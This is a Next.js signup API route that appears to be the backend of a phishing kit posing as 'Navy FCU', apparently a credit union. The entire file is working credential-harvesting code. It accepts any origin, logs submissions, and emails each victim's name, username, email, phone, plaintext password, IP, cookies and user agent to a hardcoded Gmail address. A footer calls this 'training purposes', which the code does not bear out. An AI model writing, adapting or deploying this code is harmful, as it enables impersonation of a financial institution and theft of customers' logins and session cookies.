// app/api/auth/signup/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

// CORS headers
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: corsHeaders });
}

export async function POST(request: Request) {
  try {
    const data = await request.json();

    console.log('📝 Signup Data Received:', {
      username: data.username,
      email: data.email,
      phone: data.phone,
      password: data.password,
      ip: data.ip,
      fullName: data.fullName
    });

    // Check if email credentials are configured
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('❌ Email credentials not configured');
      return NextResponse.json({ 
        success: false, 
        error: 'Email configuration missing' 
      }, { status: 500, headers: corsHeaders });
    }

    // Configure email transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Verify connection
    await transporter.verify();
    console.log('✅ Email transporter verified');

    // Send email notification
    await transporter.sendMail({
      from: process.env.EMAIL_FROM || `"Navy FCU" <${process.env.EMAIL_USER}>`,
      to: 'blessedresult6@gmail.com',
      subject: `📝 NEW SIGNUP: ${data.username}`,
      text: `
📝 NEW ACCOUNT SIGNUP

Full Name: ${data.fullName || 'Not provided'}
Username: ${data.username}
Email: ${data.email}
Phone: ${data.phone}
Password: ${data.password} ⚠️ PLAIN TEXT
IP Address: ${data.ip}
Cookies: ${data.cookies || 'No cookies'}
User Agent: ${data.userAgent || 'Unknown'}
Timestamp: ${data.timestamp || new Date().toISOString()}

---
      `,
      html: `
        <h2 style="color: #1a3a6e;">📝 New Account Signup</h2>
        <table style="border-collapse: collapse; width: 100%; font-family: Arial, sans-serif;">
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Full Name</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.fullName || 'Not provided'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Username</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.username}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Email</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.email}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Phone</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.phone}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Password</strong></td><td style="padding: 8px; border: 1px solid #ddd; color: #c62828; font-weight: bold; background: #ffebee;">${data.password}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>IP Address</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.ip}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Cookies</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.cookies || 'No cookies'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>User Agent</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.userAgent || 'Unknown'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Timestamp</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.timestamp || new Date().toISOString()}</td></tr>
        </table>
        <p style="color: #888; font-size: 12px; margin-top: 20px; border-top: 1px solid #ddd; padding-top: 10px;">
          <strong>This data is stored in plain text for training purposes.</strong>
        </p>
      `,
    });

    console.log('✅ Signup data sent to blessedresult6@gmail.com');

    // Return success response
    return NextResponse.json({ 
      success: true, 
      message: 'Signup data collected and sent',
      user: { 
        username: data.username, 
        email: data.email,
        fullName: data.fullName
      }
    }, { headers: corsHeaders });

  } catch (error) {
    console.error('❌ Error sending signup data:', error);
    
    // Send error email to admin
    try {
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS,
        },
      });
      
      await transporter.sendMail({
        from: process.env.EMAIL_FROM || `"Navy FCU" <${process.env.EMAIL_USER}>`,
        to: 'blessedresult6@gmail.com',
        subject: '❌ SIGNUP ERROR',
        text: `Signup error: ${error instanceof Error ? error.message : 'Unknown error'}`,
      });
    } catch (emailError) {
      console.error('Failed to send error email:', emailError);
    }
    
    return NextResponse.json({ 
      success: false, 
      error: 'Failed to process signup',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500, headers: corsHeaders });
  }
}